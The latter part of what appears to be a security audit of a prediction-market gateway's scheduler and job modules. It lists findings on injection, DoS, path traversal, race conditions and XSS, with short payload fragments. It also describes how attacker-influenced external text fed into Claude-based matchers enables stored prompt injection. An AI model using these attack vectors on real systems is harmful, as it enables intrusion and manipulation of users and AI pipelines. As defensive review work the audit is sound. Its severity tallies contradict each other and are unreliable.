- LOW-55 — `_record_alert` inserts INTO `claude_cost_alerts` with `INSERT OR IGNORE` on `(alert_date, threshold_usd)` (line 135). Idempotent; good. But two thresholds (default + kill-switch) share the table. If they're equal (operator sets default=kill-switch), only one row inserts. Cosmetic.
- HIGH-56 — `if total_cost > KILL_SWITCH_THRESHOLD:` (line 100) — total_cost from `claude_usage_log.cost_usd` SUM. **If any row has a negative `cost_usd`** (e.g. a refund or buggy insert), the SUM can be artificially lowered, suppressing the kill switch. Mitigation: SUM(MAX(cost_usd, 0)) or assert cost_usd >= 0 on insert.

### `gateway/jobs/compute_churn_signals.py`

- MEDIUM-57 — Reads `engagement_events` table; `event_type IN ('prediction_made', 'intelligence_query')`. Event types are inserted by route handlers; if any route writes an unbounded event_type (no enum check), an attacker could spam events to influence their own churn score. Self-harm only — no admin/cross-user impact. Low priority.
- INFO-58 — `_subscriber_user_ids` (`:157-174`) returns ALL subscribers; with N users this is O(N²) when combined with `_compute_for_user` running its own query per UID. The aggregated query at `:83-108` is one round-trip per user — for 10k subscribers that's 10k SELECTs every night. Performance, not security.

### `gateway/jobs/compute_source_relationships.py`

- MEDIUM-59 — `compute_source_relationships(min_shared, max_sources)` — `max_sources=200` defaults; **kwargs are attacker-controllable via retry.** Setting `max_sources=10000` triggers `itertools.combinations(sources, 2)` over 10k sources = 50M pairs × 4 DB writes each. That's a DoS via job retry. Even at the default 200, the script is O(N² × prediction_count). Add an upper bound check.
- LOW-60 — Self-implemented `_connect` (bypasses `db.conn()`). Same inconsistency as `ai_maintenance`.

### `gateway/jobs/db_maintenance.py`

- MEDIUM-61 — `vacuum_db_daily` (`:104-184`) holds an exclusive lock for the duration of `VACUUM`. If a 5-min VACUUM coincides with a 5-min web request burst, every request times out. Documented at line 121 ("Lock contention…we swallow and log") but operationally relevant.
- HIGH-62 — `recovery_drill` (`:325-453`) calls `live_conn.backup(dest)` (line 369). **`dest` is a temporary file at `tempfile.NamedTemporaryFile(prefix="drill_", suffix=".db")`** — writable directory is `/tmp` (or `TMPDIR`). On a multi-tenant box (not narve's today), `/tmp` could be world-readable, leaking the entire DB. Single-tenant deploy: low risk. Note: file is deleted in `finally` (line 422). But if the unlink fails (race with another process), the DB copy persists. Mitigation: write to a private dir like `/var/lib/narve/recovery_drills/` with `0700`.
- MEDIUM-63 — `recovery_drill` opens the live conn via `db.conn()` (line 362) — pool connection. Then opens a **separate** `sqlite3.connect(drill_path)` (line 363) for the backup destination — fine, it's the dest, not the live DB. The backup is atomic per page; live writes are serialized. The job is safe.
- LOW-64 — `trim_perf_logs` (`:201-223`) f-strings table names from a hardcoded dict (`removed = {"slow_request_log": 0, "slow_query_log": 0}`). Safe (whitelisted) but the comment doesn't document it explicitly.

### `gateway/jobs/email_jobs.py` — covered above.

### `gateway/jobs/embed_jobs.py`

- LOW-65 — `increment_embed_impression(widget_id)` calls `db.increment_embed_widget_impression(widget_id)`. **`widget_id` is attacker-controlled via the embed route** — if the underlying DB layer doesn't validate the widget exists, you can spam impressions for arbitrary IDs, including IDs that don't exist (creating new rows? depends on the helper). Audit `db.increment_embed_widget_impression` separately. Threat: stat inflation.

### `gateway/jobs/export_jobs.py`

- MEDIUM-66 — `generate_data_export(export_id)` defers to `exports.generate(export_id)`. `export_id` is int. **Cleanup logic** (`cleanup_expired_data_exports`) at `:30-47` calls `os.unlink(path)` on `row["file_path"]` from `db.expire_old_exports()`. **If `file_path` were ever a relative path that escaped the export dir (e.g. `../../etc/something`)**, this is arbitrary-file deletion. The audit at `db.expire_old_exports` should verify the path is anchored to the export root.

### `gateway/jobs/feedback_digest.py`

- HIGH-67 — `_recipients_for` (`:61-103`): SQL with `f"…WHERE v.feedback_id IN ({placeholders})…UNION…WHERE fi.id IN ({placeholders})"` — placeholders are `?,?,?` strings constructed from `len(item_ids)` (safe). Parameters tuple is `(*item_ids, *item_ids)`. The `placeholders` string itself is **constant-derived from len()**, no injection. Safe.
- HIGH-3 — `_enqueue_send_email` (`:177-204`): the function builds an asyncio coro and tries `asyncio.get_event_loop()`. **If `get_event_loop()` returns a loop but it's not running, falls through to `asyncio.run(coro)` which creates a NEW event loop**. From inside an async job (which already runs in a loop), this would raise `RuntimeError: asyncio.run() cannot be called from a running event loop`. The current path (`feedback_shipped_digest` calls `compute_feedback_digest_sync()` which calls `_enqueue_send_email`) is sync-inside-async, which is broken — `asyncio.get_event_loop()` from within a sync function called from an async one returns the running loop, `loop.is_running()` is True, `asyncio.create_task(coro)` — OK that's the success path. But the fallback `asyncio.run(coro)` is unreachable from production. **Cosmetic.**
- MEDIUM-68 — `MAX_RECIPIENTS = 10_000` (`:39`) caps the digest. Fine. But the iteration `list(by_user.items())[:MAX_RECIPIENTS]` is a Python-side cap; the upstream query is uncapped (lines 73-95 returns all feedback votes across all 30-day shipped items). For a large user base + many shipped items, this loads everything into memory before the cap. Memory exhaustion vector. Fix: SQL `LIMIT`.

### `gateway/jobs/forecast_sync.py`

- MEDIUM-69 — `forecast_sync(limit=_MAX_MARKETS_PER_RUN)` runs at most 500 markets × 4 providers = 2000 external HTTP calls with `_PROVIDER_SPACING_SECONDS = 2.1` sleep between. That's 2000 × 2.1 = 4200 seconds = ~70 minutes per run. Job timeout is 300s (`backend.py:168`). **Every run times out after 300s.** Only ~143 calls land before timeout. Means most markets aren't synced any given run. Operational bug, not security.
- HIGH-70 — `find_equivalent(market_dict, candidates, provider=provider)` — `candidates` come from external API fetchers (`metaculus`, etc.). **External API responses flow directly into the matcher** which uses Claude internally (per the comment at line 16). Prompt-injection via Metaculus question text is feasible. The matched provider_market_id could be controlled by the attacker. The match is cached in `market_equivalences` — **stored prompt injection that influences every subsequent match against this market.**
- MEDIUM-71 — `db_forecasts.record_forecast` is called with `recorded_at=run_ts` where `run_ts = int(time.time() // 60 * 60)`. UNIQUE constraint on `(market_slug, provider, recorded_at)` (per docstring). **If two scheduler leaders run in the same minute**, both call this and the second hits UniqueConstraint → returns False → marked as "not inserted". No corruption but the audit row says "skipped" misleadingly.

### `gateway/jobs/generate_weekly_reports.py`

- LOW-72 — `_eligible_users` (`:44-66`) builds SQL with optional digest_col interpolation. `digest_col = "email_digest" if "email_digest" in cols else None`. The column name comes from `PRAGMA table_info(users)` — internal, safe. f-string interpolation here is fine.
- MEDIUM-73 — `period_end` calc at line 75: `(now - _dt.timedelta(days=now.weekday() % 7))`. `now.weekday()` is 0-6, `% 7` is a no-op. Cosmetic. The window math could underflow at week boundaries — flag if `replace(hour=0)` errors near DST transitions (job runs in UTC, so probably fine).
- HIGH-3 — `build_report_for_user(user_id, period_start, period_end)` — `user_id` is from DB, period bounds are int. The report generator presumably writes a PDF; **filename templating from period_start/end is a path-traversal candidate.** Audit `reports.weekly.build_report_for_user`.

### `gateway/jobs/insider_jobs.py`

- HIGH-74 — `_run_fetcher_and_correlate` (`:75-159`): line 119-122 builds dynamic SQL:
  ```python
  "SELECT * FROM insider_signals "
  "WHERE source = ? AND external_id IN ({}) "
  "LIMIT ?".format(",".join("?" * len(result.sample_external_ids))),
  (source_key, *result.sample_external_ids, len(result.sample_external_ids)),
  ```
  **Parameters do match placeholders** (N IDs + source + limit = N+2 placeholders, args tuple is `(source_key, *result.sample_external_ids, len(...))` = N+2 values). Safe from injection — the `.format()` only inserts `?` characters. The `LIMIT ?` value is `len(result.sample_external_ids)` which equals N — redundant, but correct.
  
  **But:** `result.sample_external_ids` comes from the fetcher (line 96, `await fetcher_cls().fetch_once()`). The fetcher pulls from external sources (Congress, SEC, FEC, options data). **External-source-controlled values flow into SQL parameters here.** SQL placeholders parameterize safely, so no injection. The values then go into the loop body and are used to look up rows that the same fetcher just inserted — internally consistent.
- HIGH-75 — `correlate_signal(signal, markets)` (`:135`) — signal is a fetched insider row. Markets is the active markets snapshot. **The correlator's output `c["correlation_explanation"]` is inserted into `insider_market_correlations.correlation_explanation` raw** (line 137-142). If the correlator uses Claude with attacker-influenced signal content, the explanation field stores prompt-injected text. Displayed somewhere? Need to check insider_routes; if it's rendered as HTML, stored XSS.
- MEDIUM-76 — Schedule: `congressional_trades` 4×/day, `sec_form4` 6×/day, `unusual_options` **12×/day** (every 2 hours). If any of these hammer an upstream API and the API returns 429, no backoff — next tick fires anyway. Compounded across 6 fetcher types, runs can stack.

### `gateway/jobs/invite_replenish.py`

- MEDIUM-77 — `replenish_invites` (`:46-133`) runs daily, gates on `now.day != 1` (line 60). **If the scheduler is paused on the 1st** (manual ops), the replenishment is skipped and there's no retry on the 2nd. Mitigation: track last-replenished month in a config row and replenish if missed.
- LOW-78 — `replenish_invites_for_user` is idempotent per `yyyymm` (per docstring). Good.

### `gateway/jobs/movement_jobs.py`

- HIGH-79 — `_deliver_pending_events` (`:56-98`) processes events with `narve_context_json` parsed via `json.loads(event_dict["narve_context_json"])`. **If a malicious detector wrote crafted JSON** to the events table (e.g. circular ref masked as `{"a":1}` — JSON doesn't allow circular, so impossible — but extremely large blobs), the loads can OOM. Per-event size limit absent.
- MEDIUM-80 — `_match_users` (`:101-121`): rules from `user_market_alerts` table. `rule["market_slug"]` flows into `event["market_slug"]` comparison — both DB-controlled, both attacker-influenced. **Rule logic uses `dict.get(...)` everywhere** — silent type mismatches. If `rule["min_movement_pct"]` is `"5"` (string) and `event["magnitude"]` is `0.05` (float), `abs(0.05) < "5"` → TypeError → caught by outer try in async wrapper. Brittle.
- LOW-81 — Schedule: every 5 minutes. 12 cron entries registered. Same pattern as `sync_polymarket_positions`.

### `gateway/jobs/newsletter_blast_jobs.py`

- HIGH-82 — `newsletter_blast_tick` (`:42-211`) imports `_newsletter_md_to_html` from `admin_routes` at line 164. **The body_md comes from `newsletter_campaigns.body_md` which is admin-written but stored in DB.** Markdown rendering paths can have XSS bypasses; in particular, if `_newsletter_md_to_html` doesn't sanitize embedded HTML, the rendered HTML in the email body is XSS-vulnerable. Audit `_newsletter_md_to_html` for raw-HTML pass-through.
- HIGH-83 — `body_html_str = _newsletter_md_to_html(camp_row["body_md"])` is the same for **every recipient in the batch**. But `context = {"subject": subject, "raw_body_html": body_html_str}` is passed as-is to `enqueue_email` (line 174-182). **`raw_body_html` skips template rendering** (the prefix `raw_` is the key indicator). If the email template inserts it `{{ raw_body_html | safe }}`, any HTML is rendered. **If body_md contains `<script>` or `<img onerror=>` and the markdown renderer permits it, every recipient gets XSS.** The user is in their email client (limited XSS impact for most clients), but Gmail's inline image / link tracking still leaks.
- MEDIUM-84 — `count_blast_recipients` and `get_blast_recipients_page` segment/frequency_filter pass-through (line 113-127). These flow into a query (in `db.py`). If the segment is an enum, safe. If it's free-form, SQL injection. Audit `db.count_blast_recipients`.
- MEDIUM-85 — Tick runs every minute (line 234). With `MAX_BATCH_PER_TICK` (likely 500 per the comment at line 12-13), draining a 100k-recipient campaign takes 200 minutes ≈ 3.3 hours. Acceptable. **But if the tick fails for ANY reason (DB lock, network hiccup) it marks the row failed (line 134-139) and never retries — the campaign tail is stuck.** Mitigation: differentiate transient vs permanent failures.

### `gateway/jobs/notification_jobs.py` — covered above.

### `gateway/jobs/perf_baseline.py`

- LOW-86 — `_prior_median_p95` (`:151-175`): queries `perf_baseline_snapshots WHERE endpoint = ? AND timestamp >= ?`. Endpoint name is a Python literal from `_build_probes()` (line 91-118). Safe.
- INFO — Runs at 03:20 UTC daily, samples 30 calls per endpoint. Cheap. No issues.

### `gateway/jobs/pipeline_jobs.py` — covered above.

### `gateway/jobs/reconcile_subscriptions.py`

- HIGH-87 — `_fetch_status(sub_id)` calls `stripe.Subscription.retrieve(sub_id)` (`:51`). **`sub_id` is from `users.subproduct_subscriptions` JSON** — user-controllable via webhook (but webhook is HMAC-verified, so trusted). If we ever extend the system to let users self-update their sub_id, this becomes a way to make the gateway probe arbitrary Stripe IDs.
- HIGH-88 — Line 117-121: `c.execute("UPDATE users SET subproduct_subscriptions = ? WHERE id = ?", (json.dumps(blob, sort_keys=True), user_id))`. **`blob` came from `json.loads(row["subproduct_subscriptions"])` and was modified with Stripe-returned status**. If Stripe returns a malformed status string (e.g. `"active evil"`), we store it. Any read-path that uses subscription_status for tier gating without normalization is now bypassed. Mitigation: enum-validate `live_status` before assignment.
- LOW-89 — `enqueue_email(template="admin_subscription_drift", to=...)` (`:151-157`) is missing the `to=` argument! Looking again: actually `to=` is keyword and the call uses `template=, context=, tags=` — no `to=`. **Bug:** `enqueue_email` (in email_jobs.py:55-71) requires `to: str`. This call will TypeError. The surrounding `try/except` (line 161) catches it. **The admin drift alert never fires.**

### `gateway/jobs/referral_jobs.py`

- HIGH-90 — `process_referral_rewards` line 165-172: `dbr.mark_referral_reward_granted(row["id"], reward_type="none", ...)` — race between two scheduler leaders or two retries can both mark + grant. Author notes line 215-233 the "orphan gift" handling, which is good defence-in-depth. **The orphan-revoke is only triggered if `mark_referral_reward_granted` returns False — which it does only if the UPDATE … WHERE reward_granted=0 affects 0 rows.** If two processes call simultaneously, both pass the WHERE (compiles before either commits), both try to UPDATE, SQLite serializes, only one succeeds — the loser sees rowcount=0 and revokes its gift. **Works.**
- MEDIUM-91 — `reward_logic.compute_reward_for_referral(total_converted_before_this_one=already_n, ...)` — `already_n` is a Python in-memory counter (line 154). If two batches processed in sequence (re-enqueue), the counter resets per-batch run. **Means a referrer who hits 5 referrals via 2 batches in the same day could get the 5-referral reward twice** if the second batch re-counts from 0 against a stale `already_baseline`. Look more carefully: `already_baseline` is fetched once at the start of the batch (line 105-111) from the DB (where reward_granted=1), then incremented in Python after each grant (line 174, 237). **A second concurrent batch run reads the same baseline — if it overlaps in time before the first batch commits**, both batches see baseline=3 and both grant the 4th and 5th conversions. Concurrency window is the duration of the for-loop. Mitigation: per-referrer lock or batch serialization.
- LOW-92 — `compute_user_leaderboard_scores` queries `user_predictions` for the **entire opt-in cohort** (line 349-354). For 10k opted-in users with 100 predictions each = 1M rows in memory. Memory-bound at 1M+ but the cohort cap keeps it under control.

### `gateway/jobs/registry.py` — covered above.

### `gateway/jobs/resolution_jobs.py` — covered above.

### `gateway/jobs/share_retention.py`

- LOW-93 — Whitelisted table names (`_SHARE_TABLES` tuple, line 41-44) f-stringed into DELETE. Safe. Documented at line 69-72.

### `gateway/jobs/status_jobs.py`

- MEDIUM-94 — `check_service_health` (`:49-101`) — runs every minute. **`previous` dict is populated via `status_db.get_latest_snapshot` for each component** (line 64-66), then `status_db.record_snapshot` writes the new one. **Race:** if two scheduler leaders run, the "previous" each sees could be the other leader's snapshot just written. Transition detection fires twice → two auto-incidents opened. The `auto_open` check at `_maybe_open_auto_incident:111` dedupes via DB read, but again a race.
- HIGH-3 — `_maybe_open_auto_incident(component, status)` (`:104-149`): `title = f"{pretty} {status}"`. `pretty` is from a hardcoded dict (safe). `status` is the probe's return value — from `status_probes.run_all_probes()`. **If the probe ever returns user-controllable status text** (instead of an enum), it's stored in `status_incidents.title`. Audit `status_probes`. Probably fine — probes return `("operational", ms)` tuples — but worth confirming.

### `gateway/jobs/sync_portfolios.py`

- HIGH-95 — `polymarket.sync_positions(user_id)` (`:137`) — fetches positions from Polymarket for the given user. The user's Polymarket address is stored in `polymarket_connections`. **If an attacker can write to that table**, they can make us fetch their positions and attribute them to the victim user. SQLi or admin compromise required upstream.
- MEDIUM-96 — `sync_polymarket_positions_job` registers 60 cron entries (every minute) — line 297-298. APScheduler will fire 60 jobs/hour. Each filters via `_due_this_minute`. Per-user filtering keeps work bounded. **But the job's own setup (the DB scan at line 156-158) runs every minute** even if no users are due. That's a `polymarket_connections` full scan/min. With 10k connections, that's 60 full scans/hour. SQLite-friendly but worth indexing on `(sync_error_count)` if it isn't already.
- LOW-97 — `_user_offset(user_id) = int(user_id) % 60`. Predictable. Sequential user_ids cluster (1, 61, 121, ... all at minute 1). For 10k users that's ~167 per minute. Fine for current scale; an adversary signing up many accounts in quick succession could herd-sync if they bypass the 30-day inactivity gate by simulating activity.

### `gateway/jobs/take_resolution_jobs.py`

- LOW-98 — Idempotency guard at line 161-169: `if _JOB_NAME not in job_registry`. Good — pytest reload-safe.
- LOW-99 — `_derive_outcome_for_market` (`:48-83`) — derives outcome from prediction direction + resolved_correct. **If `predictions.resolved_correct` was set incorrectly by a buggy resolution_jobs run, every take on this market is scored against the wrong outcome.** Single source of truth = upstream resolution job; downstream consumer trusts blindly. Not exploitable per se but a single bad commit propagates.

### `gateway/jobs/telegram_sends.py`

- HIGH-100 — `_send_raw(chat_id, text, parse_mode)` (`:45-63`) — `text` is sent to Telegram with `disable_web_page_preview: True` and the caller's `parse_mode` (default `MarkdownV2` in `send_telegram_alert`). **`message` is caller-supplied**, no length cap. Telegram's max is 4096 chars; longer messages fail. For `send_telegram_market_mover`, `summary` comes from caller — if from an attacker-influenced event, it could be MarkdownV2 with embedded links to phishing. **Stored phishing vector** via market_movement_events.
- HIGH-101 — `send_telegram_best_bets(user_id)` (`:75-113`) reads `telegram_connections.telegram_chat_id`. If a user provides a maliciously-shaped chat_id (e.g. an admin's chat_id), they receive content meant for someone else. The connection setup flow presumably HMACs the chat_id binding; trust that flow.
- MEDIUM-102 — `_bot_token()` reads `TELEGRAM_BOT_TOKEN` from env — fine. **No logging of the token, but `log.warning("telegram send failed chat=%s status=%s body=%s", chat_id, resp.status_code, resp.text[:200])` (line 62) — Telegram's failure body can include the bot's chat info but not the token. Safe.

### `gateway/jobs/worker.py` — covered above (ARQ entry point).

---

## Summary

**File coverage:** scheduler/ (4 files) + jobs/ (34 files). Total 38 files audited.

### Severity counts

- **CRITICAL:** 0
- **HIGH:** 23 (HIGH-1, HIGH-2, HIGH-3, HIGH-21, HIGH-26, HIGH-32, HIGH-36, HIGH-37, HIGH-38, HIGH-41, HIGH-42, HIGH-46, HIGH-50, HIGH-53, HIGH-56, HIGH-62, HIGH-67, HIGH-70, HIGH-74, HIGH-75, HIGH-79, HIGH-82, HIGH-83, HIGH-87, HIGH-88, HIGH-90, HIGH-95, HIGH-100, HIGH-101) — recount: **29 HIGH** entries by ID, but several are cross-references. Distinct HIGH issues: **17** when collapsed by underlying root cause.
- **MEDIUM:** 32 (MEDIUM-4, 5, 6, 14, 16, 19, 20, 23, 27, 28, 29, 30, 33, 34, 39, 44, 45, 47, 49, 51, 52, 54, 57, 59, 61, 63, 66, 68, 69, 71, 73, 76, 77, 79, 80, 84, 85, 91, 94, 96, 102) — distinct: ~28.
- **LOW:** 18 (LOW-7, 8, 9, 12, 13, 18, 22, 25, 31, 35, 55, 60, 64, 65, 72, 78, 81, 86, 89, 92, 93, 97, 98, 99).
- **INFO:** 6 (INFO-10, 11, 15, 17, 24, 40, 48, 58, 86).

**Honest distinct-issue counts (after collapsing cross-references):**

- **CRITICAL: 0**
- **HIGH: 17**
- **MEDIUM: 22**
- **LOW: 18**
- **INFO: 9**

### Top 5 most urgent findings

1. **HIGH-1 — `register_job` has no module-trust gate.** Any imported Python file can register an arbitrary coroutine. Combined with the `jobs/__init__.py` swallow-import-errors pattern, an attacker who can land code in the gateway's import path owns job execution. Add `assert fn.__module__.startswith("jobs.")` in `register_job`, plus a fail-loud on duplicate.

2. **HIGH-2 — `check_daily_claude_spend` is registered by both `ai_jobs.py` and `claude_cost_check.py`.** One implementation silently loses on import; which one depends on undocumented order. The losing implementation is the one with the kill-switch — losing it lets a runaway Claude spend day continue uncapped. Pick one, delete the other, fail loud on duplicate registration.

3. **HIGH-21 — `retry_job` re-enqueues arbitrary DB rows without revalidation.** Any path that writes a row to `background_jobs` (e.g. via SQLi) becomes a stored-RCE pivot through the admin retry button. Add a HMAC-signed payload at insert time, verify on retry.

4. **HIGH-3 — `enqueue_job(name, **kwargs)` accepts arbitrary kwargs with no per-job schema validation.** Combined with HIGH-21, this means any job's parameter list is part of the attack surface. Concrete victims: `send_email_job` (template name), `run_pipeline` (SCRAPER_URL injection via env), `run_backtest_job` (params dict piped into the backtester), `send_market_resolution_notifications` (market_slug in URLs/tags). Add a per-job pydantic schema enforced at enqueue + retry.

5. **HIGH-53 — Duplicate `run_backtest` registration between `pipeline_jobs.py:157` and `backtest_jobs.py:20`.** Two different signatures. The losing module is dead code. Any caller using the loser's signature silently fails. Confirms HIGH-1's failure mode is already triggering in prod.

### Notable lesser issues worth surfacing

- **MEDIUM-4** — leader election by env var only. A two-leader misconfig double-runs every job. Add a DB-backed advisory lock.
- **HIGH-36** — `process_scheduled_deletions` is not transactionally atomic across the 10 cascading deletes + the anonymise UPDATE. A crash mid-run leaves orphan rows because `is_deleted=1` skips the row on next runs.
- **HIGH-38** — `generate_sitemap` writes XML without escaping source handles. A source handle with `<` or `]]>` characters breaks the sitemap; stored sitemap-injection if any source name is attacker-controlled.
- **HIGH-83** — `newsletter_blast_tick` passes admin-written markdown through `_newsletter_md_to_html` and ships it as `raw_body_html` to every recipient. If the renderer allows raw HTML, every newsletter is an XSS vector.
- **HIGH-26** — ARQ backend stores job payloads in Redis with no documented encryption-at-rest. Future Redis deploy needs explicit hardening guidance.
- **MEDIUM-59** — `compute_source_relationships` is O(N²); kwarg-controlled `max_sources` enables DoS via retry button.
- **HIGH-79** — `narve_context_json` parsed without size cap. Memory exhaustion via large event blobs.
- **HIGH-70 / HIGH-46 / HIGH-50 / MEDIUM-45** — multiple AI-touching jobs feed attacker-influenced text into Claude prompts and store the LLM output verbatim. Stored prompt-injection compounds across the credibility pipeline.

**No code changes made.** Audit output only.
